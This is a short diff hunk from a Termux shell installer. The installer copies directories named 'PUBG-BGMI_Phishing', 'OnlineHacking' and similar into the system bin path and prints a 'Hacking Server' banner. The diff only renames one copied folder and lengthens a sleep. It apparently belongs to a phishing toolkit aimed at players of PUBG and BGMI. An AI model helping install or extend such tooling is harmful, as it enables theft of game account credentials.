@@ -264,13 +264,13 @@ cp -R PUBG /data/data/com.termux/files/usr/bin
 cp -R BGMI /data/data/com.termux/files/usr/bin
 cp -R PUBG-BGMI_Phishing /data/data/com.termux/files/usr/bin
 cp -R OnlineHacking /data/data/com.termux/files/usr/bin
-cp -R links /data/data/com.termux/files/usr/bin
+cp -R start-link /data/data/com.termux/files/usr/bin
 echo
 echo
 logo
 echo
 echo ""echo -e "\e[35m[+] Connect Online Hacking PUBG BGMI Hacking Server......  \e[m "
-sleep 5
+sleep 7
 echo
 echo
 clear
